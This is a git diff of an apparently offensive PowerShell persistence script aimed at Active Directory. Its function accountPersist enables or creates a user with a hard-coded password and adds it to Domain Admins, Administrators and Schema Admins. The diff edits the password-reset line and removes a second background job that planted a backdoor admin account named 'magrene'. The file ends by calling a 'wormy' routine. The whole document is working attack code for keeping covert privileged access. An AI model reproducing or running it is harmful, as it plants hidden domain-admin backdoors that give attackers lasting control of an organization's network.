@@ -57,7 +57,7 @@ function accountPersist{
     try{
         Get-aduser $username
         enable-adaccount $username
-        Set-ADAccountPassword -Identity $username -OldPassword (ConvertTo-SecureString -AsPlainText "Tossking123@" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "Tossking123@" -Force)
+        Set-ADAccountPassword -Identity $username -NewPassword (ConvertTo-SecureString -AsPlainText "Tossking123@" -Force)
         Add-ADGroupMember -identity 'Domain Admins' -members $username
         Add-ADGroupMember -identity 'Administrators' -members $username
         Add-ADGroupMember -identity 'Schema Admins' -members $username
@@ -144,32 +144,5 @@ start-job -ScriptBlock {
     }
 }
 
-start-job -ScriptBlock{
-
-    function accountPersist2{
-
-        $username='magrene'
-
-    
-            Get-aduser $username
-            enable-adaccount $username
-            Set-ADAccountPassword -Identity $username -OldPassword (ConvertTo-SecureString -AsPlainText "Tossking123@" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "Tossking123@" -Force)
-            Add-ADGroupMember -identity 'Domain Admins' -members $username
-            Add-ADGroupMember -identity 'Administrators' -members $username
-            Add-ADGroupMember -identity 'Schema Admins' -members $username
-        
-   
-    
-            new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring 'Tossking123@' -asplaintext -force) -Enabled $True
-            Add-ADGroupMember -identity 'Domain Admins' -members $username
-            Add-ADGroupMember -identity 'Administrators' -members $username
-            Add-ADGroupMember -identity 'Schema Admins' -members $username
-    
-
-
-    }
-
-    accountPersist2
-}
 
 wormy
